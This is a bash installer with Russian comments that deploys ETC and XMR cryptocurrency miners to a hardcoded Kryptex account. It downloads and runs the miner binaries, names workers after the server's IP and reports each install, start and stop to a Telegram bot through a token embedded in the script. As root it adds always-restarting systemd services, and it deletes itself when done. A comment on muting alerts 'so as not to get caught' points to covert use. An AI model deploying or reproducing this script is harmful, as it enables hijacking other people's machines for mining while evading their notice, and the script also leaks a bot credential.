#!/bin/bash

#==============================================================================
# ЯДРО - НЕ ТРОГАТЬ. ЭТОТ СКРИПТ ТЕПЕРЬ УМНЫЙ.
#==============================================================================
# Режим работы (определяется автоматически)
# ROOT_MODE=true - установка в систему, требует sudo
# ROOT_MODE=false - локальная установка в домашний каталог
ROOT_MODE=false
if [ "$(id -u)" -eq 0 ]; then
  ROOT_MODE=true
fi

# Пути установки (определяются автоматически)
if [ "$ROOT_MODE" = true ]; then
  INSTALL_DIR="/opt/mining"
  BIN_DIR="/usr/local/bin"
  LOG_DIR="/var/log"
else
  INSTALL_DIR="$HOME/mining"
  BIN_DIR="$HOME/.local/bin"
  LOG_DIR="$INSTALL_DIR/log"
fi

#==============================================================================
# КОНФИГУРАЦИЯ (можешь поменять, если захочешь)
#==============================================================================
KRIPTEX_USERNAME="krxYNV2DZQ"
TELEGRAM_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TELEGRAM_CHAT_ID="7032066912"
ETC_POOL="etc.kryptex.network:7033"
XMR_POOL="xmr.kryptex.network:7029"

#==============================================================================
# УМНЫЕ ФУНКЦИИ (переписаны мной)
#==============================================================================

# Получение IP и формирование Worker ID
get_server_ip() {
    curl -s -4 ifconfig.me 2>/dev/null || curl -s -6 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}' 2>/dev/null || echo "0.0.0.0"
}

SERVER_IP=$(get_server_ip)
WORKER_ID=$(echo "$SERVER_IP" | tr -d '.')
WORKER_NAME="${KRIPTEX_USERNAME}.${WORKER_ID}"
ETC_USERNAME="$WORKER_NAME"
XMR_USERNAME="$WORKER_NAME"

# Уведомление в Telegram
send_telegram_message() {
    local message="$1"
    # В локальном режиме телеграм-уведомления отключены, чтобы не палиться. Если надо - убери 'return 0'.
    if [ "$ROOT_MODE" = false ]; then return 0; fi
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "text=${message}" \
        -d "parse_mode=HTML" > /dev/null 2>&1
}

# Установка зависимостей
install_dependencies() {
    if [ "$ROOT_MODE" = true ]; then
        echo "[INFO] Режим Бога: Устанавливаю системные зависимости (wget, curl, cron)..."
        apt-get update -qq >/dev/null && apt-get install -y wget curl cron >/dev/null || yum install -y wget curl cronie >/dev/null
    else
        echo "[INFO] Режим Смертного: Пропускаю установку системных зависимостей."
        echo "[WARN] Убедись, что у тебя установлены: wget, curl."
        # Проверим наличие и предупредим
        ! command -v wget &> /dev/null && echo "[ERROR] wget не найден! Установи его вручную." && exit 1
        ! command -v curl &> /dev/null && echo "[ERROR] curl не найден! Установи его вручную." && exit 1
    fi
}

# Установка майнеров (теперь с динамическими путями)
install_miners() {
    echo "[INFO] Создаю каталоги в $INSTALL_DIR..."
    mkdir -p "$INSTALL_DIR/etc"
    mkdir -p "$INSTALL_DIR/xmr"
    if [ "$ROOT_MODE" = false ]; then mkdir -p "$LOG_DIR"; fi

    echo "[INFO] Устанавливаю lolMiner (ETC) в $INSTALL_DIR/etc..."
    wget -qO- https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz | tar -xz -C "$INSTALL_DIR/etc" --strip-components=1
    chmod +x "$INSTALL_DIR/etc/lolMiner"

    echo "[INFO] Устанавливаю XMRig (XMR) в $INSTALL_DIR/xmr..."
    wget -qO- https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz | tar -xz -C "$INSTALL_DIR/xmr" --strip-components=1
    chmod +x "$INSTALL_DIR/xmr/xmrig"

    echo "[OK] Майнеры загружены."
}

# Создание скриптов запуска и утилит управления
create_scripts() {
    echo "[INFO] Создаю скрипты запуска и утилиты в $BIN_DIR..."
    mkdir -p "$BIN_DIR"

    # Скрипт запуска ETC
    cat > "$INSTALL_DIR/etc/start.sh" << EOF
#!/bin/bash
cd "$INSTALL_DIR/etc"
./lolMiner --algo ETCHASH --pool $ETC_POOL --user $ETC_USERNAME --tls off --nocolor
EOF
    chmod +x "$INSTALL_DIR/etc/start.sh"

    # Скрипт запуска XMR
    cat > "$INSTALL_DIR/xmr/start.sh" << EOF
#!/bin/bash
cd "$INSTALL_DIR/xmr"
./xmrig -o $XMR_POOL -u $XMR_USERNAME -p x --randomx-1gb-pages
EOF
    chmod +x "$INSTALL_DIR/xmr/start.sh"

    # Утилита start-mining
    cat > "$BIN_DIR/start-mining" << EOF
#!/bin/bash
echo "[INFO] Запускаю майнеры..."
nohup $INSTALL_DIR/etc/start.sh > $LOG_DIR/etc-miner.log 2>&1 &
nohup $INSTALL_DIR/xmr/start.sh > $LOG_DIR/xmr-miner.log 2>&1 &
sleep 1
echo "[OK] Майнеры запущены в фоновом режиме. Логи в $LOG_DIR"
send_telegram_message "[START] Майнеры на $(hostname) запущены."
EOF
    chmod +x "$BIN_DIR/start-mining"

    # Утилита stop-mining
    cat > "$BIN_DIR/stop-mining" << EOF
#!/bin/bash
echo "[INFO] Останавливаю майнеры..."
pkill -f "$INSTALL_DIR/etc/lolMiner"
pkill -f "$INSTALL_DIR/xmr/xmrig"
sleep 1
pkill -9 -f "$INSTALL_DIR/etc/lolMiner"
pkill -9 -f "$INSTALL_DIR/xmr/xmrig"
echo "[OK] Майнеры остановлены."
send_telegram_message "[STOP] Майнеры на $(hostname) остановлены."
EOF
    chmod +x "$BIN_DIR/stop-mining"

    # Утилита mining-status
    cat > "$BIN_DIR/mining-status" << EOF
#!/bin/bash
echo "=== СТАТУС МАЙНЕРОВ ==="
pgrep -f "$INSTALL_DIR/etc/lolMiner" >/dev/null && echo "[OK] ETC Miner (GPU): ЗАПУЩЕН" || echo "[--] ETC Miner (GPU): ОСТАНОВЛЕН"
pgrep -f "$INSTALL_DIR/xmr/xmrig" >/dev/null && echo "[OK] XMR Miner (CPU): ЗАПУЩЕН" || echo "[--] XMR Miner (CPU): ОСТАНОВЛЕН"
echo " "
echo "=== ХЕШРЕЙТ (последние данные) ==="
ETC_H=\$(tail -20 $LOG_DIR/etc-miner.log 2>/dev/null | grep -o "Average speed:.*" | tail -1 | sed 's/Average speed: //')
XMR_H=\$(tail -20 $LOG_DIR/xmr-miner.log 2>/dev/null | grep -o "speed [0-9.]*" | tail -1)
echo "ETC: \${ETC_H:-нет данных}"
echo "XMR: \${XMR_H:-нет данных}"
echo " "
echo "Для полной информации смотри логи в $LOG_DIR"
EOF
    chmod +x "$BIN_DIR/mining-status"
}

# Настройка автозапуска
setup_autostart() {
    if [ "$ROOT_MODE" = true ]; then
        echo "[INFO] Режим Бога: Настраиваю автозапуск через systemd..."
        # systemd для ETC
        cat > /etc/systemd/system/etc-miner.service << EOF
[Unit]
Description=ETC Mining Service
After=network.target
[Service]
Type=simple
ExecStart=$INSTALL_DIR/etc/start.sh
Restart=always
RestartSec=10
StandardOutput=append:$LOG_DIR/etc-miner.log
StandardError=append:$LOG_DIR/etc-miner.log
User=root
[Install]
WantedBy=multi-user.target
EOF
        # systemd для XMR
        cat > /etc/systemd/system/xmr-miner.service << EOF
[Unit]
Description=XMR Mining Service
After=network.target
[Service]
Type=simple
ExecStart=$INSTALL_DIR/xmr/start.sh
Restart=always
RestartSec=10
StandardOutput=append:$LOG_DIR/xmr-miner.log
StandardError=append:$LOG_DIR/xmr-miner.log
User=root
[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload
        systemctl enable etc-miner.service xmr-miner.service >/dev/null
        echo "[OK] Сервисы systemd (etc-miner, xmr-miner) созданы и включены."
    else
        echo "[INFO] Режим Смертного: Пропускаю настройку системного автозапуска."
        echo "[INFO] Для ручного автозапуска можешь добавить в свой crontab:"
        echo "  @reboot $BIN_DIR/start-mining"
    fi
}

#==============================================================================
# ГЛАВНЫЙ ПОТОК ВЫПОЛНЕНИЯ
#==============================================================================
main() {
    echo "======================================================================="
    if [ "$ROOT_MODE" = true ]; then
        echo "  РЕЖИМ БОГА АКТИВИРОВАН (установка с правами root)"
    else
        echo "  РЕЖИМ СМЕРТНОГО (локальная установка без root)"
    fi
    echo "======================================================================="
    
    send_telegram_message "[INSTALL] Начало установки на $(hostname) (режим: $ROOT_MODE)"

    install_dependencies
    install_miners
    create_scripts
    setup_autostart

    echo ""
    echo "======================================================================="
    echo "  [OK] НАСТРОЙКА ЗАВЕРШЕНА!"
    echo "======================================================================="
    echo ""

    if [ "$ROOT_MODE" = false ]; then
        # Проверим, есть ли $HOME/.local/bin в PATH
        if [[ ":$PATH:" != *":$HOME/.local/bin:"* ]]; then
            echo "[WARN] Каталог $HOME/.local/bin не найден в твоем PATH."
            echo "[INFO] Чтобы команды были доступны глобально, добавь это в свой .bashrc или .zshrc:"
            echo '  export PATH="$HOME/.local/bin:$PATH"'
            echo "[INFO] А затем выполни: source ~/.bashrc (или ~/.zshrc)"
        fi
    fi

    echo "ЗАПУСКАЮ МАЙНЕРЫ В ПЕРВЫЙ РАЗ..."
    # Сначала остановим на всякий случай, если что-то уже запущено
    "$BIN_DIR/stop-mining" >/dev/null
    sleep 2
    "$BIN_DIR/start-mining"

    echo ""
    echo "======================================================================="
    echo "  КОМАНДЫ УПРАВЛЕНИЯ:"
    echo "    start-mining     - запустить майнеры"
    echo "    stop-mining      - остановить майнеры"
    echo "    mining-status    - проверить статус"
    echo "======================================================================="
    
    send_telegram_message "[SUCCESS] Установка на $(hostname) завершена."
    
    # Самоуничтожение скрипта
    echo "[INFO] Самоуничтожение скрипта установщика..."
    rm -f -- "$0"
}

main "$@"
